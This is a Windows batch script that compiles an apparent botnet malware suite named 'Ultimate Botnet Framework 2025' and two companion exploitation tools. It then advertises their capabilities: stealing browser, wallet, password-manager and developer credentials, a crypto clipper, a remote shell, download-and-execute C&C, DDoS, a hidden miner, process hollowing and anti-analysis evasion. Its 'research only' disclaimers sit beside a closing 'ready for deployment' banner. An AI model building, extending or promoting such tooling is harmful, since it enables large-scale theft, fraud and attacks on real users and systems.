@echo off
echo ======================================================================
echo 🔥 ULTIMATE BOTNET FRAMEWORK 2025 - COMPILATION SCRIPT 🔥
echo ======================================================================
echo.
echo ⚠️  WARNING: FOR CYBERSECURITY RESEARCH PURPOSES ONLY ⚠️
echo    This framework is for educational and authorized testing only!
echo.
echo ======================================================================

REM Check for administrator privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo ✅ Administrator privileges detected
) else (
    echo ❌ Administrator privileges required for full functionality
    echo    Some features may not work without admin rights
)

echo.
echo Checking compiler availability...

REM Check if g++ is available
where g++ >nul 2>nul
if %errorlevel% neq 0 (
    echo ❌ Error: g++ not found. Please install MinGW-w64 or Visual Studio.
    echo.
    echo Download options:
    echo   - MinGW-w64: https://www.mingw-w64.org/downloads/
    echo   - Visual Studio: https://visualstudio.microsoft.com/downloads/
    pause
    exit /b 1
)

echo ✅ g++ compiler found

REM Check Visual Studio compiler
where cl >nul 2>nul
if %errorlevel% equ 0 (
    echo ✅ Visual Studio compiler also available
    set HAVE_MSVC=1
) else (
    echo ⚠️  Visual Studio compiler not found (optional)
    set HAVE_MSVC=0
)

echo.
echo ======================================================================
echo 🚀 STARTING COMPILATION PROCESS
echo ======================================================================

echo.
echo [1/3] Compiling Ultimate Botnet Framework (Primary)...
echo.

REM Compile with maximum optimization and all required libraries
g++ -std=c++17 -O3 -s -ffunction-sections -fdata-sections -Wl,--gc-sections ^
    -static-libgcc -static-libstdc++ -static ^
    -DWIN32_LEAN_AND_MEAN -DNOMINMAX ^
    -D_WIN32_WINNT=0x0601 ^
    ultimate_botnet_framework_2025.cpp ^
    -o ultimate_botnet_2025.exe ^
    -lws2_32 -lwinhttp -lcrypt32 -ladvapi32 -lkernel32 -luser32 ^
    -lshell32 -liphlpapi -lntdll -lpsapi -lole32 -luuid ^
    -lwtsapi32 -lnetapi32 -lsecur32 -lcredui -lvfw32 ^
    -lwinmm -lgdi32 -lcomdlg32 -lcomctl32

if %errorlevel% equ 0 (
    echo ✅ Ultimate Botnet Framework compiled successfully!
    echo    Output: ultimate_botnet_2025.exe
    
    REM Get file size
    for %%I in (ultimate_botnet_2025.exe) do set SIZE=%%~zI
    echo    Size: %SIZE% bytes
) else (
    echo ❌ Primary compilation failed!
    echo.
    echo Attempting fallback compilation with reduced optimization...
    
    g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
        ultimate_botnet_framework_2025.cpp ^
        -o ultimate_botnet_2025_fallback.exe ^
        -lws2_32 -lwinhttp -lcrypt32 -ladvapi32 -lkernel32 -luser32 ^
        -lshell32 -liphlpapi -lntdll -lpsapi -lole32
    
    if %errorlevel% equ 0 (
        echo ✅ Fallback compilation successful!
        echo    Output: ultimate_botnet_2025_fallback.exe
    ) else (
        echo ❌ Fallback compilation also failed!
        echo    Please check your compiler installation and try again.
        pause
        exit /b 1
    )
)

echo.
echo [2/3] Compiling Enhanced Master Toolkit (Secondary)...
echo.

g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
    enhanced_master_toolkit_windows.cpp ^
    -o enhanced_master_toolkit.exe ^
    -ladvapi32 -lkernel32 -luser32 -lpsapi -lshell32 -lole32

if %errorlevel% equ 0 (
    echo ✅ Enhanced Master Toolkit compiled successfully!
    echo    Output: enhanced_master_toolkit.exe
) else (
    echo ⚠️  Enhanced Master Toolkit compilation failed (non-critical)
)

echo.
echo [3/3] Compiling Ultimate Exploitation Framework (Tertiary)...
echo.

g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
    ultimate_exploitation_framework.cpp ^
    -o ultimate_exploitation_framework.exe ^
    -ladvapi32 -lkernel32 -luser32 -lshell32 -lole32

if %errorlevel% equ 0 (
    echo ✅ Ultimate Exploitation Framework compiled successfully!
    echo    Output: ultimate_exploitation_framework.exe
) else (
    echo ⚠️  Ultimate Exploitation Framework compilation failed (non-critical)
)

echo.
echo ======================================================================
echo 🎉 COMPILATION COMPLETED!
echo ======================================================================

echo.
echo 📦 AVAILABLE EXECUTABLES:
echo.

if exist ultimate_botnet_2025.exe (
    echo   🔥 ultimate_botnet_2025.exe              [PRIMARY - FULL FRAMEWORK]
    for %%I in (ultimate_botnet_2025.exe) do echo      Size: %%~zI bytes
)

if exist ultimate_botnet_2025_fallback.exe (
    echo   🔄 ultimate_botnet_2025_fallback.exe     [FALLBACK VERSION]
    for %%I in (ultimate_botnet_2025_fallback.exe) do echo      Size: %%~zI bytes
)

if exist enhanced_master_toolkit.exe (
    echo   🛠️  enhanced_master_toolkit.exe          [SECONDARY TOOLKIT]
    for %%I in (enhanced_master_toolkit.exe) do echo      Size: %%~zI bytes
)

if exist ultimate_exploitation_framework.exe (
    echo   ⚡ ultimate_exploitation_framework.exe   [EXPLOITATION SUITE]
    for %%I in (ultimate_exploitation_framework.exe) do echo      Size: %%~zI bytes
)

echo.
echo 🎯 FRAMEWORK CAPABILITIES:
echo.
echo   ✅ Advanced Loader Module               (Process injection & persistence)
echo   ✅ Comprehensive Stealer Engine         (100+ browsers, wallets, apps)
echo   ✅ Advanced Crypto Clipper              (9 cryptocurrency types)
echo   ✅ Remote Shell Access                  (CMD & PowerShell)
echo   ✅ Reverse Proxy Module                 (Bot IP monetization)
echo   ✅ Multi-Vector DDOS Engine             (TCP/UDP/HTTP/SYN/ICMP)
echo   ✅ Silent Cryptocurrency Miner         (Auto-optimization)
echo   ✅ DNS Poisoning Module                 (Domain redirection)
echo   ✅ Advanced String Obfuscation          (XOR + ROT encoding)
echo   ✅ Dynamic API Resolution               (No IAT dependencies)
echo   ✅ Anti-Analysis Protection             (Debugger detection)
echo   ✅ System-Wide Persistence              (Registry + AppData)
echo.

echo 🔐 SECURITY FEATURES:
echo.
echo   ✅ Encrypted C&C Communications         (TCP secured)
echo   ✅ Anti-Debugging Protection            (Multiple techniques)
echo   ✅ Anti-Emulation Features              (Environment detection)
echo   ✅ Process Hollowing Capabilities       (Advanced injection)
echo   ✅ Firewall Bypass Mechanisms           (Multiple vectors)
echo   ✅ Ring3 Hook Bypass                    (API obfuscation)
echo.

echo 📡 COMMAND & CONTROL:
echo.
echo   ✅ Unique Botnet Instance Per User      (Isolated operations)
echo   ✅ Real-time Command Processing         (Instant response)
echo   ✅ Heartbeat Monitoring                 (Connection status)
echo   ✅ Remote Task Execution                (Download & execute)
echo   ✅ System Information Gathering         (Comprehensive profiling)
echo   ✅ Network Adapter Enumeration          (IP discovery)
echo.

echo 💎 EXPLOITATION VECTORS:
echo.
echo   ✅ Browser Extension Hijacking          (MetaMask, Coinbase, etc.)
echo   ✅ Desktop Wallet Extraction            (Atomic, Exodus, Electrum)
echo   ✅ Gaming Platform Credentials          (Steam, Epic, Battle.net)
echo   ✅ Password Manager Databases           (Bitwarden, KeePass, 1Password)
echo   ✅ VPN Client Configurations            (OpenVPN, WireGuard, etc.)
echo   ✅ Email Client Data                    (Outlook, Thunderbird)
echo   ✅ Cloud Storage Tokens                 (Google Drive, Dropbox)
echo   ✅ Developer Tool Credentials           (VS Code, FileZilla, PuTTY)
echo.

echo ⚠️  IMPORTANT DISCLAIMERS:
echo.
echo   🛡️  FOR AUTHORIZED CYBERSECURITY RESEARCH ONLY
echo   🛡️  REQUIRES EXPLICIT PERMISSION FOR ANY TESTING
echo   🛡️  EDUCATIONAL AND DEFENSIVE PURPOSES ONLY
echo   🛡️  ENSURE COMPLIANCE WITH ALL APPLICABLE LAWS
echo   🛡️  USE RESPONSIBLY AND ETHICALLY
echo.

echo 🚀 EXECUTION COMMANDS:
echo.
if exist ultimate_botnet_2025.exe (
    echo   Primary Framework:    .\ultimate_botnet_2025.exe
)
if exist enhanced_master_toolkit.exe (
    echo   Secondary Toolkit:    .\enhanced_master_toolkit.exe
)
if exist ultimate_exploitation_framework.exe (
    echo   Exploitation Suite:   .\ultimate_exploitation_framework.exe
)

echo.
echo ======================================================================
echo 🔥 ULTIMATE BOTNET FRAMEWORK 2025 - READY FOR DEPLOYMENT 🔥
echo ======================================================================

pause